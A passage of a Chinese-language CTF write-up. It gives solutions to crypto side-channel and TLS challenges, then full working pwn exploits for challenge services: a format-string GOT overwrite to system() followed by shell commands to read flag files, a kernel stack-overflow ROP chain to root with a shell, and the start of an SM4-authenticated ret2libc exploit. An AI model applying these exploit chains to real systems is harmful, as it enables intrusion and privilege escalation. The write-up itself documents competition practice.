    prefix = b'cold-forge/release/v1'
    msg0 = bytes.fromhex(tel['message_hex'])
    msg_variants = {
        'msg-raw': msg0,
        'msg-sha256(raw)': hashlib.sha256(msg0).digest(),
        'msg-hexascii': tel['message_hex'].encode(),
        'msg-sha256(hexascii)': hashlib.sha256(tel['message_hex'].encode()).digest(),
    }
    aux_variants = {
        'aux0': b'\x00' * 32,
        'aux1': b'\x01' * 32,
        'aux=sha256(prefix)': hashlib.sha256(prefix).digest(),
        'aux=prefix': prefix,
        'aux=sha256(msg0)': hashlib.sha256(msg0).digest(),
    }

    def add_sig(tbl, mname, keydesc, sig):
        tbl[mname + ' | ' + keydesc] = sig

    sigs = {}
    for mname, m in msg_variants.items():
        for aname, aux in aux_variants.items():
            try:
                sig, _ = bip340_sign(m, s, aux)
                add_sig(sigs, mname, f'bip340({aname})', sig)
            except Exception:
                pass
        # RFC6979 variants (over the same message object)
        try:
            add_sig(sigs, mname, 'rfc6979-evenkey', bip340_sign_rfc6979(m, s, True)[0])
        except Exception:
            pass
        try:
            add_sig(sigs, mname, 'rfc6979-rawkey', bip340_sign_rfc6979(m, s, False)[0])
        except Exception:
            pass
        # simple deterministic nonce schemes
        for dname, dfn in [
            ('k=H(s||m)', lambda: hashlib.sha256(bytes_from_int(s) + m).digest()),
            ('k=H(m||s)', lambda: hashlib.sha256(m + bytes_from_int(s)).digest()),
            ('k=H(s||Px||m)', lambda: hashlib.sha256(bytes_from_int(s) + bytes_from_int(ec_mul(s, G)[0]) + m).digest()),
        ]:
            try:
                kint = int.from_bytes(dfn(), 'big') % N
                if kint == 0:
                    continue
                d0 = s % N
                P = ec_mul(d0, G)
                d = d0 if has_even_y(P) else (N - d0) % N
                P = ec_mul(d, G)
                R = ec_mul(kint, G)
                k = (N - kint) % N if not has_even_y(R) else kint
                R = ec_mul(k, G)
                e = int.from_bytes(tagged_hash('BIP0340/challenge', xonly(R) + xonly(P) + m), 'big') % N
                sig = xonly(R) + bytes_from_int((k + e * d) % N)
                add_sig(sigs, mname, dname, sig)
            except Exception:
                pass

    found = None
    for name, sig in sigs.items():
        key = hashlib.sha256(prefix + sig).digest()
        pt = try_decrypt(key, nonce_bytes, aad, ct, tag)
        if pt is not None:
            found = (name, sig, pt)
            break
    if found:
        name, sig, pt = found
        print('FOUND with sig variant:', name)
        print('signature hex:', sig.hex())
        print('plaintext:', pt)
        # flag detection
        import re
        flags = re.findall(rb'(?:flag|ctf|FLAG)\{[^}\n]{0,100}\}', pt)
        print('flags found:', flags)
    else:
        print('no decryption candidate matched (tried %d sigs)' % len(sigs))
        for name in list(sigs)[:12]:
            print(' - tried', name, sigs[name].hex()[:32])
    print('elapsed %.1fs' % (time.time() - t0))
```


---

### 4. SlashKEM（crypto-03）

#### Summary

ML-KEM 变体的功耗侧信道：CPA 恢复 112 个 secret 系数，剩下 16 个无泄漏系数（c≡3 mod 8，SNR≈0）用 **t = M·s + e (mod 3329), e∈{-1,0,1}** 的精确代数约束做 5^8×5^8 MITM 补全，AES-GCM 解出 flag。

#### Solution

- 关键发现：每个系数 c 的 Montgomery 乘积泄漏点位于 trace 时间 `96 + bitrev7(c)`（128 系数映射窗口 [96,223]），配合 u[:,c] 做 5 假设相关分析，margin≈0.1/900 样本。
- 16 个弱系数用 meet-in-the-middle（5^8 签名行 join）搜索，唯一解通过 128 行残差 ∈{-1,0,1} 校验（challenge.secret_error_is_valid=True）。
- key = SHA256(encode_secret(s))，AES-GCM `decrypt_and_verify` tag 校验通过。

#### Flag

```
flag{708d7b97-0b8d-4d99-aa1a-b23d3b13cc51}
```

#### 工具与版本

- 宿主 python + numpy 2.5 + pycryptodome；`solve.py` 全流程无交互复跑（cpa2.py / fill16.py / decrypt_flag.py 为分步辅助）。

#### 完整脚本

`crypto-03/solve.py`：

```python
#!/usr/bin/env python3
"""SlashKEM side-channel solve (湾区杯2026 CRYPTO 05) — run from challenges/crypto-03/.

Stage 1: CPA.  Decapsulation leaks coefficient c's Montgomery product s[c]*u[c]
         at trace time 96 + bitrev7(c).  Recover all 128 coeffs in {-2..2}.
Stage 2: The 16 coeffs c≡3 (mod 8) leak ~nothing (SNR ~ 0).  Fill them by MITM
         search over the exact algebraic constraint t = M s + e (mod q), e in {-1,0,1}.
Stage 3: key = sha256(encode_secret(s)); flag = AES-GCM(key, nonce="SLASHKEM2026").

Requires: challenge.py, output.txt, traces.npz in cwd; numpy + pycryptodome.
Run: python solve.py   (prints the flag)
"""
import numpy as np, json, hashlib, base64, sys

Q = 3329
MONT_R = 1 << 16
QINV = (-pow(Q, -1, MONT_R)) % MONT_R
SV = (-2, -1, 0, 1, 2)

def montgomery_reduce(a, q=Q):
    t = (a * QINV) & 0xFFFF
    u = (a + t * q) >> 16
    return u % q

def centered(x, q=Q):
    x %= q
    if x > q // 2:
        x -= q
    return x

def hw16(x):
    return (int(x) & 0xFFFF).bit_count()

def leakage_model(s, p):
    z = montgomery_reduce(s * p)
    pre = montgomery_reduce(7 * p + 0x1234)
    return hw16((centered(z) & 0xFFFF) ^ (centered(pre) & 0xFFFF))

def bitrev7(c):
    return int(f'{c:07b}'[::-1], 2)

def negacyclic_mul(a, b, q=Q):
    n = len(a); out = [0]*n
    for i, ai in enumerate(a):
        for j, bj in enumerate(b):
            idx = i + j
            sign = 1
            if idx >= n:
                idx -= n; sign = -1
            out[idx] = (out[idx] + sign*ai*bj) % q
    return out

def derive_key(secret):
    encoded = bytearray()
    for poly in secret:
        for coeff in poly:
            assert coeff in (-2,-1,0,1,2)
            encoded.append(coeff + 2)
    return hashlib.sha256(bytes(encoded)).digest()

def load_M_t():
    d = json.load(open('output.txt', encoding='utf-8'))
    pub = d['public_key']
    A, t = pub['A'], pub['t']
    cols = []
    for idx in range(128):
        sp, ci = idx // 64, idx % 64
        basis = [0]*64; basis[ci] = 1
        col = []
        for row in range(2):
            col.extend(negacyclic_mul(A[row][sp], basis))
        cols.append(col)
    M = np.array(cols, dtype=np.int64).T      # t_flat = M @ s_flat + e
    t_flat = np.array([int(x) for p in t for x in p], dtype=np.int64)
    return d, M, t_flat

def cpa_recover():
    d = np.load('traces.npz')
    traces = d['traces'].astype(np.float64)
    u = d['u_samples'].astype(np.int64)
    th = traces - traces.mean(axis=0)
    th_n = np.sqrt((th**2).sum(axis=0)); th_n[th_n == 0] = 1
    guess = []
    weak = []
    for c in range(128):
        colc = th[:, 96 + bitrev7(c)]
        colc = colc - colc.mean()
        cn = np.sqrt((colc**2).sum()) or 1.0
        pc = u[:, c]
        H = np.array([[leakage_model(h, int(p)) for p in pc] for h in SV], dtype=np.float64)
        hh = H - H.mean(axis=1, keepdims=True)
        hn = np.sqrt((hh**2).sum(axis=1))[:, None]; hn[hn == 0] = 1
        corr = (hh @ colc) / (hn[:, 0] * cn)
        hi = int(np.argmax(np.abs(corr)))
        guess.append(SV[hi])
        if abs(corr[hi]) < 0.5 or abs(corr[hi]) - np.abs(np.delete(corr, hi)).max() < 0.05:
            weak.append(c)
    return np.array(guess, dtype=np.int64), weak

def fill16(M, t_flat, guess, weak):
    """MITM over the 16 weak coeffs: find s_U in {-2..2}^16 with e = t-Ms in {-1,0,1}."""
    UA, UB = weak[:8], weak[8:]
    known = [c for c in range(128) if c not in weak]
    b = (t_flat - M[:, known] @ guess[known]) % Q
    SIG = np.array([0, 42, 95], dtype=int)
    vals = np.array([-2,-1,0,1,2], dtype=np.int64)

    def enum(cols_sub, chunk=8192):
        CS = [M[:, c] for c in cols_sub]
        total = 5**len(cols_sub)
        g0 = 0
        while g0 < total:
            n = min(chunk, total - g0)
            block = np.zeros((n, 128), dtype=np.int32)
            for j in range(n):
                g = g0 + j; v = np.zeros(128, dtype=np.int64)
                for kk in range(len(cols_sub)):
                    v += vals[g % 5] * CS[kk]; g //= 5
                block[j] = v % Q
            yield np.arange(g0, g0 + n), block.astype(np.int16)
            g0 += n

    def decode(idx, cols_sub):
        v = np.zeros(128, dtype=np.int64)
        for kk in range(len(cols_sub)):
            v += vals[idx % 5] * M[:, cols_sub[kk]]; idx //= 5
        return v % Q

    B_keys, B_idx = [], []
    for idx, xb in enum(UB, 16384):
        k0 = xb[:, SIG[0]].astype(np.int64) * Q * Q
        k1 = xb[:, SIG[1]].astype(np.int64) * Q
        k2 = xb[:, SIG[2]].astype(np.int64)
        B_keys.append(k0 + k1 + k2)
        B_idx.append(idx)
    B_keys, B_idx = np.concatenate(B_keys), np.concatenate(B_idx)
    o = np.argsort(B_keys); B_keys, B_idx = B_keys[o], B_idx[o]

    e_grid = (np.array(np.meshgrid(*([[-1,0,1]]*3), indexing='ij')).reshape(3, -1).T % Q)

    for idx_a, xa in enum(UA, 4096):
        z = (b[SIG][None, :] - xa[:, SIG]) % Q
        ka = ((z[:, None, :] + e_grid[None, :, :]) % Q)
        ka = (ka[:, :, 0]*Q*Q + ka[:, :, 1]*Q + ka[:, :, 2]).ravel()
        pos = np.clip(np.searchsorted(B_keys, ka), 0, B_keys.size - 1)
        hit = B_keys[pos] == ka
        aidx = np.repeat(idx_a, 27)
        for ha, hb in set(zip(aidx[hit].tolist(), B_idx[pos[hit]].tolist())):
            r = (b - decode(ha, UA) - decode(hb, UB)) % Q
            if np.all(np.isin(r, (0, 1, Q-1))):
                s = guess.copy()
                for kk in range(8):
                    s[UA[kk]] = (ha // (5**kk)) % 5 - 2
                    s[UB[kk]] = (hb // (5**kk)) % 5 - 2
                return s
    return None

def main():
    d, M, t_flat = load_M_t()
    guess, weak = cpa_recover()
    print('CPA: 128 guesses; weak (no leakage) coeffs:', len(weak), weak, file=sys.stderr)
    s = fill16(M, t_flat, guess, weak)
    if s is None:
        raise SystemExit('FAILED: no algebraic-consistent completion; strong CPA picks suspect')
    # full residual sanity
    r = (t_flat - M @ s) % Q
    ok = bool(np.all(np.isin(r, (0, 1, Q-1))))
    print('t - M s residual in {-1,0,1}:', ok, file=sys.stderr)
    assert ok
    key = derive_key([s[0:64].tolist(), s[64:128].tolist()])
    flag = d['flag']
    from Crypto.Cipher import AES
    ct = AES.new(key=key, mode=AES.MODE_GCM, nonce=base64.b64decode(flag['nonce']))
    pt = ct.decrypt_and_verify(base64.b64decode(flag['ciphertext']), base64.b64decode(flag['tag']))
    print(pt.decode())

if __name__ == '__main__':
    main()
```


---

### 5. mosaic_0rtt（crypto-04）

#### Summary

解析 TLS1.3 X25519MLKEM768 混合握手 pcap + 客户端崩溃残留临时私钥 → 恢复 64B shared secret → HKDF 密钥调度推出 resumption PSK → 离线 binder 校验 → 远程 **0-RTT 两阶段**取 flag。

#### Solution

- `hybrid_decap`（OpenSSL 3.5 provider 小工具）输入须用原始 1120B share（32B X25519 pub || 1088B MLKEM768 ct），带长度前缀的 1124B 会报 wrong ciphertext size。
- TLS1.3 密钥调度全验证：Finished 双向、NST 明文解出（每会话唯一 nonce=0、32B ticket）→ bootstrap PSK 与 binder_source PSK 各自推出。
- binder 离线校验的关键修复：按 RFC8446 只截断到 identities 末尾、**不改写 3 字节握手长度**，否则 binder 必然不匹配。
- 把 bootstrap PSK 填回 session_template.der 被置零的 master_key 字段 → `openssl sess_id` 可解析。
- 远程：`tls_resume` 走 0-RTT——① resume lab.edge.example GET /v1/release/preflight 拿 nonce；② resume release.edge.example POST /v1/release/confirm（nonce + RFC 9266 exporter channel-binding）→ HTTP 200 返回 flag。

#### Flag

```
flag{0b7241b6-81f1-4e46-9480-0488f30131c0}
```

#### 工具与版本

- python3 + cryptography(AESGCM)；Docker `ossl35:local`（OpenSSL 3.5.7 + hybrid_decap + tls_resume）；`python remote_stage.py 47.95.232.179 26708` 一键复现。

#### 完整脚本

`crypto-04/remote_stage.py`：

```python
#!/usr/bin/env python3
"""
Remote two-stage 0-RTT runner (non-interactive).

Usage:
    python remote_stage.py HOST [PORT]

Feeds the recovered LAB bootstrap resumption PSK to the provided tls_resume
client (OpenSSL 3.5 TLS1.3 X25519MLKEM768 0-RTT client) inside the ossl35:local
docker image. Both lab.edge.example and release.edge.example are mapped via
--add-host to the given HOST (the two vhosts live on one edge IP).

The client itself performs:
  stage 1: resume lab.edge.example, 0-RTT GET /v1/release/preflight  -> nonce
  stage 2: resume release.edge.example, POST /v1/release/confirm with the
           nonce and RFC 9266 EXPORTER-Channel-Binding (32 B, empty context)

Exit 0 + flag{...} printed == success. Any failure is reported verbatim.
Requires: challenge files session_template.der/gateway-ca.crt/tls_resume in CWD,
          docker image ossl35:local, network route to HOST.
"""
import sys, os, subprocess, re, shutil

HERE = os.path.dirname(os.path.abspath(__file__))
PSK = "03e9e7f83954606e14674b521f17062f2c2ffd176750b2e0227b30becf1378bb"
SESSION = "session_template.der"
CA = "gateway-ca.crt"
CLIENT = "tls_resume"

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "lab.edge.example"
    port = sys.argv[2] if len(sys.argv) > 2 else "9999"
    # stage in ASCII-only temp dir (challenge path is non-ASCII; bind mounts flaky)
    work = os.path.join(HERE, ".remote_work")
    if os.path.exists(work):
        shutil.rmtree(work, ignore_errors=True)
    os.makedirs(work)
    for fn, src in (("session_template.der", os.path.join(HERE, "att", "session_template.der")),
                    ("gateway-ca.crt", os.path.join(HERE, "gateway-ca.crt")),
                    ("tls_resume", os.path.join(HERE, "tls_resume"))):
        shutil.copy(src, os.path.join(work, fn))
    cmd = [
        "docker", "run", "--rm",
        "--add-host", "lab.edge.example:%s" % host,
        "--add-host", "release.edge.example:%s" % host,
        "-v", "%s:/w" % work.replace("\\", "/"), "-w", "/w",
        "ossl35:local",
        "sh", "-c",
        "timeout 60 ./tls_resume lab.edge.example %s %s %s" % (port, SESSION, PSK),
    ]
    print("[*] %s -> %s:%s" % (CLIENT, host, port))
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
    except subprocess.TimeoutExpired:
        print("[-] client hung (infra likely unreachable); killed after 90s")
        shutil.rmtree(work, ignore_errors=True)
        return 2
    out = (r.stdout or "") + "\n" + (r.stderr or "")
    print(out)
    m = re.search(r"flag\{[^}]+\}", out, re.I)
    if m:
        print("[+] FLAG:", m.group(0))
        shutil.rmtree(work, ignore_errors=True)
        return 0
    print("[-] no flag in output (rc=%s)" % r.returncode)
    shutil.rmtree(work, ignore_errors=True)
    return 1

if __name__ == "__main__":
    sys.exit(main())
```


---

## Pwn

### 6. logd（pn-01）

#### Summary

Blowfish-ECB 解出登录密码 → ticket 的 ChaCha8 明文直接 printf 构成**格式化字符串漏洞**：泄露 PIE/libc 后把 printf@got 改写为 system（Partial RELRO），之后的每个 ticket 明文即 shell 命令。

#### Solution

- key=`"L0gd-S3cr3t-K3y!"` 解密二进制内 PW_CT 得密码 `"L0gd-Ma1nT-2026!"`。
- `%73$p` 泄 PIE（base+0x4df0）、`%75$p` 泄 libc（base+0x29d90，glibc 2.35-0ubuntu3.14）、`%65$s` 读 puts@got 交叉验证。
- `%hn/%hhn` 写 printf@got → system；注意写计数必须按**泄露的远程基址动态计算**（本地计数硬编码会因 libc 低 16 位不同写歪）。
- 发 ticket 明文 `cat /flag`。

#### Flag

```
flag{75ceae2d-c40e-48c4-99c1-f8e0b1e30d97}
```

#### 工具与版本

- idalib-mcp 静态分析 + pwntools（宿主 venv）+ Docker ubuntu:22.04 本地复现（glibc 与附件精确同版本）；`exp.py` 打 59.110.216.117:24759。

#### 完整脚本

`pn-01/exp.py`：

```python
#!/usr/bin/env python3
# exp.py for pwn-01 "logd" (湾区杯2026)
# Protocol: password (Blowfish-ECB key "L0gd-S3cr3t-K3y!", decrypt PW_CT) ->
#   "L0gd-Ma1nT-2026!"; ticket = u16le len + ChaCha8 ciphertext, decrypted
#   plaintext is passed to printf() -> format string vuln.
# Exploit: leak PIE (%73$p -> base+0x4df0) and libc (%75$p -> libc+0x29d90),
#   verify via %s-read of puts@got, then overwrite printf@got with system()
#   (%hn/%hhn), then every ticket plaintext is executed as a shell command.
import sys, os, re
from pwn import *
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from logd_crypto import chacha8_crypt

KEY = b"ChaCha8T1ck3tK3y20260psChannelXX"
NONCE = b"T1ck3tN0nce!"
PW = b"L0gd-Ma1nT-2026!"

OFF_PIE_LEAK = 0x4DF0          # %73$p  = pie_base + 0x4df0 (.fini_array ptr)
OFF_LIBC_LEAK = 0x29D90        # %75$p  = libc_base + 0x29d90 (__libc_start_main+0xd0)
OFF_PUTS = 0x80E10
OFF_SYSTEM = 0x50D70
OFF_PRINTF = 0x606F0
GOT_PRINTF = 0x5028
GOT_PUTS = 0x5018

HOST, PORT = "59.110.216.117", 24759
DIR = os.path.dirname(os.path.abspath(__file__))

context.log_level = "info"
TIMEOUT = 15

def start():
    if args.LOCAL:
        return process([
            r"C:\Program Files\Docker\Docker\resources\bin\docker.exe",
            "run", "--rm", "-i", "--security-opt", "seccomp=unconfined",
            "-v", DIR + ":/w", "ubuntu:22.04", "bash", "-c",
            "LD_PRELOAD=/w/libc.so.6 setarch -R /w/logd",
        ])
    return remote(HOST, PORT, timeout=TIMEOUT)

def ticket(io, pt: bytes) -> bytes:
    """Send one ticket; return everything printed before the next prompt."""
    assert 0 < len(pt) <= 0x40
    ct = chacha8_crypt(pt, KEY, NONCE)
    io.send(p16(len(pt)) + ct)
    return io.recvuntil(b"ticket>", timeout=TIMEOUT)[:-len(b"ticket>")]

def pwn_once():
    """Full chain: login -> leaks -> verify -> printf@got=system. Returns io."""
    io = start()
    io.recvuntil(b"password: ", timeout=TIMEOUT)
    io.send(PW + b"\n")
    r = io.recvuntil(b"ticket>", timeout=TIMEOUT)
    assert b"login ok" in r, r
    out = ticket(io, b"%73$p|%75$p")
    m = re.findall(rb"0x[0-9a-f]+", out)
    assert len(m) >= 2, out
    pie = int(m[0], 16) - OFF_PIE_LEAK
    libc = int(m[1], 16) - OFF_LIBC_LEAK
    pt = b"%65$s" + b"A" * (56 - 5) + p64(pie + GOT_PUTS)
    out = ticket(io, pt)
    got_puts = u64(out[1:].split(b"A" * 20)[0].ljust(8, b"\x00"))
    assert got_puts == libc + OFF_PUTS, f"libc mismatch {got_puts:#x}"
    got = pie + GOT_PRINTF
    target = libc + OFF_SYSTEM
    # low 2 bytes via %hn at got, byte 2 via %hhn at got+2 (byte3+ identical
    # because |system - printf| < 0x1000000 within one libc mapping)
    cur = libc + OFF_PRINTF
    assert (cur >> 24) == (target >> 24), "byte3 differs, need wider write"
    w1 = target & 0xFFFF
    w2 = (target >> 16) & 0xFF
    c1 = w1 if w1 else 0x10000
    c2 = (w2 - c1) & 0xFF
    fmt = ("%%%dc%%64$hn" % c1).encode()
    if c2:
        fmt += ("%%%dc%%65$hhn" % c2).encode()
    else:
        fmt += b"%65$hhn"
    pt = fmt + b"A" * (48 - len(fmt)) + p64(got) + p64(got + 2)
    ticket(io, pt)
    log.success(f"chain done: pie={pie:#x} libc={libc:#x}")
    return io

def main():
    io = pwn_once()
    flag = None
    cmds = [
        b"echo RCE_OK 2>&1",
        b"cat /flag 2>&1",
        b"cat /flag.txt 2>&1",
        b"ls -la / 2>&1",
        b"find / -maxdepth 4 -iname '*flag*' 2>/dev/null 2>&1",
        b"cat /home/*/flag* 2>&1",
        b"cat /root/flag* 2>&1",
        b"id 2>&1",
    ]
    for cmd in cmds:
        try:
            out = ticket(io, cmd)
        except Exception as e:
            log.warning(f"conn dropped on {cmd!r}: {e}; reconnecting")
            try:
                io.close()
            except Exception:
                pass
            io = pwn_once()
            continue
        log.info(f"$ {cmd.decode()} -> {out.strip()[:300]!r}")
        m = re.search(rb"flag\{[^}]*\}", out, re.I)
        if m:
            flag = m.group(0)
            break
    if flag:
        log.success(f"FLAG: {flag.decode(errors='replace')}")
        print("FLAG=" + flag.decode(errors="replace"))
    else:
        log.warning("flag not found in tried paths")
    try:
        io.close()
    except Exception:
        pass

if __name__ == "__main__":
    main()
```


---

### 7. knote（pn-02，kernel）

#### Summary

knote.ko ioctl cmd 0x4B4E01 泄露 _printk 破 KASLR；cmd 0x4B4E02 的 `memcpy(rbp-0x50, note_in, n)` **fortify 上界错配**（检查 n≤0x200 而栈缓冲仅 0x50）造成内核栈溢出，kernel ROP 提权。

#### Solution

- ROP 链：`commit_creds(&init_cred)` → `swapgs_restore_regs_and_return_to_usermode+0x36` KPTI trampoline 返回用户态。
- 提权后 root shell `cat /flag`。
- 坑点：busybox 无 base64，exp 用 uudecode+gzip heredoc 直传；`mov rdi,rax` gadget 缺失改用 `commit_creds(&init_cred)`。

#### Flag

```
flag{1ca07846-b372-4ee4-8d2f-22cdf114038c}
```

#### 工具与版本

- idalib-mcp + pwntools + vmlinux-to-elf（--no-deps）+ Docker gcc:13 静态编译；`exp.py` 打 47.93.236.122:26842（qemu-over-tcp）。

#### 完整脚本

`pn-02/exp.c`：

```c
// knote - kernel 5.15 stack overflow exploit
// bug: knote_ioctl cmd 0x4B4E02: memcpy(rbp-0x50, note_in, n) with n<=0x200
//      (fortify bound is 0x200 but stack buffer is only 0x50) -> retaddr hijack
// leak: cmd 0x4B4E01 -> copy_to_user(&_printk) -> KASLR bypass
// privesc: ROP commit_creds(&init_cred) -> KPTI trampoline -> userland
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdint.h>

#define CMD_READ_NOTE 0x4B4E00
#define CMD_LEAK      0x4B4E01
#define CMD_WRITE     0x4B4E02

// offsets from vmlinux (base 0xffffffff81000000, kallsyms recovered)
#define OFF_PRINTK    0xd38044UL   // _printk
#define OFF_POP_RDI   0xb3820UL    // pop rdi ; ret
#define OFF_COMMIT    0xf86f0UL    // commit_creds
#define OFF_INITCRED  0x1e8a8c0UL  // init_cred
#define OFF_KPTI      0xe01170UL   // swapgs_restore_regs_and_return_to_usermode
#define KPTI_SKIP     0x36         // -> mov rdi, rsp ; ...

static uint64_t user_cs, user_ss, user_sp, user_rflags, user_rip;
static uint64_t kbase;

static void save_state(void) {
    __asm__ volatile(
        ".intel_syntax noprefix;"
        "mov %0, cs;"
        "mov %1, ss;"
        "mov %2, rsp;"
        "pushfq;"
        "pop %3;"
        ".att_syntax;"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
        :: "memory");
}

// post-exploit: raw-syscall only (no libc stack alignment worries)
static void win(void) {
    char buf[512];
    char rbuf[64];
    int n;
    if (getuid() != 0) {
        const char msg[] = "[-] privesc failed\n";
        write(1, msg, sizeof(msg) - 1);
        _exit(1);
    }
    const char ok[] = "[+] root! uid=0\n";
    write(1, ok, sizeof(ok) - 1);
    int f = open("/flag", O_RDONLY);
    if (f < 0) f = open("/root/flag", O_RDONLY);
    if (f >= 0) {
        n = read(f, buf, sizeof(buf));
        write(1, "FLAG:", 5);
        write(1, buf, n);
        write(1, "\n", 1);
        close(f);
    } else {
        const char nf[] = "[-] flag not found\n";
        write(1, nf, sizeof(nf) - 1);
    }
    // drop to a root shell for interactive fallback
    char *argv[] = { "/bin/sh", NULL };
    execve("/bin/sh", argv, NULL);
    _exit(0);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    save_state();
    user_rip = (uint64_t)win;

    int fd = open("/dev/knote", O_RDWR);
    if (fd < 0) { perror("open /dev/knote"); return 1; }

    uint64_t leak = 0;
    if (ioctl(fd, CMD_LEAK, &leak) < 0) { perror("ioctl leak"); return 1; }
    if ((leak & 0xffff000000000000UL) != 0xffff000000000000UL) {
        printf("[-] bad leak: %#lx\n", leak);
        return 1;
    }
    kbase = leak - OFF_PRINTK;
    printf("[*] _printk = %#lx\n[*] kbase   = %#lx\n", leak, kbase);

    static uint64_t payload[0x200 / 8];
    memset(payload, 0, sizeof(payload));

    struct req { uint64_t ptr; uint64_t size; } req;

    int i = 0x40 / 8;            // saved r12 slot
    payload[i++] = 0;                            // r12
    payload[i++] = 0;                            // r13
    payload[i++] = 0;                            // saved rbp
    payload[i++] = kbase + OFF_POP_RDI;          // ret addr
    payload[i++] = kbase + OFF_INITCRED;         // rdi = &init_cred
    payload[i++] = kbase + OFF_COMMIT;           // commit_creds(&init_cred)
    payload[i++] = kbase + OFF_KPTI + KPTI_SKIP; // KPTI trampoline
    payload[i++] = 0;                            // [rdi+0x00] rdi restore (junk)
    payload[i++] = 0;                            // [rdi+0x08] unused
    payload[i++] = user_rip;                     // [rdi+0x10]
    payload[i++] = user_cs;                      // [rdi+0x18]
    payload[i++] = user_rflags;                  // [rdi+0x20]
    payload[i++] = user_sp;                      // [rdi+0x28]
    payload[i++] = user_ss;                      // [rdi+0x30]

    req.ptr  = (uint64_t)payload;
    req.size = (uint64_t)i * 8;                  // 0xb0 <= 0x200
    printf("[*] payload size = %#lx\n", req.size);
    ioctl(fd, CMD_WRITE, &req);

    // never reached if exploit works
    printf("[-] ioctl returned, exploit failed\n");
    return 0;
}
```

`pn-02/exp.py`：

```python
#!/usr/bin/env python3
# knote remote exploit runner: qemu-over-tcp boot -> shell -> uuencode+gzip upload -> run -> read flag
# transfer: busybox lacks base64 but has uudecode+gunzip; heredoc avoids per-line echo
import gzip
import hashlib
import os
import re
import sys
import time
from pwn import *

context.log_level = 'info'

HOST = '47.93.236.122'
PORT = 26842
PROMPT = b'/ $ '
LOCAL_EXP = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'exp')


def uuencode(data: bytes, name: str) -> bytes:
    out = [b'begin 644 ' + name.encode() + b'\n']
    for i in range(0, len(data), 45):
        chunk = data[i:i+45]
        line = bytes([(len(chunk) + 32) if len(chunk) else 96])
        for j in range(0, len(chunk), 3):
            trip = chunk[j:j+3].ljust(3, b'\0')
            n = (trip[0] << 16) | (trip[1] << 8) | trip[2]
            for k in range(4):
                c = (n >> (18 - 6 * k)) & 0x3F
                line += bytes([c + 32 if c else 96])  # backtick for zero (GNU style)
        out.append(line + b'\n')
    out.append(b'`\nend\n')
    return b''.join(out)


def wait_prompt(io, timeout=30):
    return io.recvuntil(PROMPT, timeout=timeout)


def main():
    raw = open(LOCAL_EXP, 'rb').read()
    md5 = hashlib.md5(raw).hexdigest()
    gz = gzip.compress(raw, 9)
    uu = uuencode(gz, 'exp.gz')
    log.info(f'exp: {len(raw)}B md5={md5} | gz: {len(gz)}B | uu: {len(uu)}B, {uu.count(bytes([10]))} lines')

    io = None
    for attempt in range(10):
        try:
            io = remote(HOST, PORT, timeout=30)
            break
        except PwnlibException:
            log.warning(f'connect attempt {attempt+1} failed, retry in 5s')
            time.sleep(5)
    if io is None:
        log.error('cannot connect')
        sys.exit(1)

    # 1. wait for kernel boot + busybox shell
    log.info('waiting for boot...')
    io.recvuntil(PROMPT, timeout=120)
    log.success('got shell')

    # 2. echo off (prompt stays '/ $ '; never change PS1 -> no delimiter-in-echo issue)
    io.sendline(b'stty -echo')
    wait_prompt(io, 10)

    # 3. upload via uudecode heredoc
    io.sendline(b"rm -f /tmp/exp.gz /tmp/exp; uudecode -o /tmp/exp.gz << 'UUEND'")
    time.sleep(0.5)
    t0 = time.time()
    step = 4096
    for i in range(0, len(uu), step):
        io.send(uu[i:i+step])
        time.sleep(0.02)
    io.sendline(b'UUEND')
    log.info(f'uu data sent in {time.time()-t0:.1f}s, waiting for decode...')
    wait_prompt(io, 60)

    # 4. gunzip, verify md5, run
    io.sendline(b'gunzip -c /tmp/exp.gz > /tmp/exp && chmod +x /tmp/exp && md5sum /tmp/exp')
    out = wait_prompt(io, 30)
    log.info(f'md5sum out: {out.strip()!r}')
    if md5.encode() not in out:
        log.error('md5 mismatch, upload corrupted')
        io.close()
        sys.exit(2)

    log.info('running exploit...')
    io.sendline(b'/tmp/exp')
    try:
        out = io.recvuntil(b'FLAG:', timeout=30)
        sys.stdout.write(out.decode(errors='replace'))
        flag = io.recvline(timeout=10).strip()
        print(flag.decode(errors='replace'))
        m = re.search(rb'\w+\{[^}\n]*\}', flag)
        if m:
            log.success(f'flag: {m.group(0).decode()}')
        # fallback: we should be in a root shell now
        io.sendline(b'cat /flag /root/flag 2>/dev/null; id')
        out = io.recvrepeat(5)
        sys.stdout.write(out.decode(errors='replace'))
    except EOFError:
        log.error('connection closed (kernel panic?)')
        sys.exit(3)
    io.close()


if __name__ == '__main__':
    main()
```


---

### 8. gatewayd（pn-03）

#### Summary

GWv2 TLV 协议（"WG" 魔数 9 字节头 + type/len/value）：硬编码密钥 SM4 加密挑战过认证后，cmd3 注册帧经 SM4-CTR 解密 memcpy 进距 saved rbp 仅 0xC0 的栈缓冲（上限 256）→ **栈溢出 ret2libc**。

#### Solution

- cmd1 取 16B 挑战，cmd2 用 key `"GW-SM4-2026-K3y!"` SM4 加密挑战完成认证拿 session。
- cmd3 type=0x20 帧超长覆盖返回地址；发错误魔数帧触发 serve_loop 返回进入 ROP。
- 两段式：puts(puts@got) 泄露 libc（glibc 2.31）后 ret 回 serve_loop，第二段 `system("/bin/sh")`。
- 栈对齐 pad 自动枚举（pad1=1/pad2=1 出 shell）。

#### Flag

```
flag{f06a36eb-e04f-462a-bac8-27b8210e4411}
```

#### 工具与版本

- pwntools + idalib-mcp + ROPgadget（pop rdi;ret @0x401ad3）+ Docker ubuntu:20.04 本地复现；`exp.py` 打 123.56.22.57:35119，sm4.py 直接 import 复用。

#### 完整脚本

`pn-03/exp.py`：

```python
#!/usr/bin/env python3
# pwn-03 gatewayd exploit — GWv2 TLV protocol + SM4 auth + cmd3 memcpy stack overflow -> ROP
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from pwn import *
from sm4 import SM4

HOST = sys.argv[1] if len(sys.argv) > 1 else "123.56.22.57"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 35119
KEY = b"GW-SM4-2026-K3y!"

POP_RDI = 0x401AD3
RET     = 0x40101A
PUTS_PLT = 0x4010E4
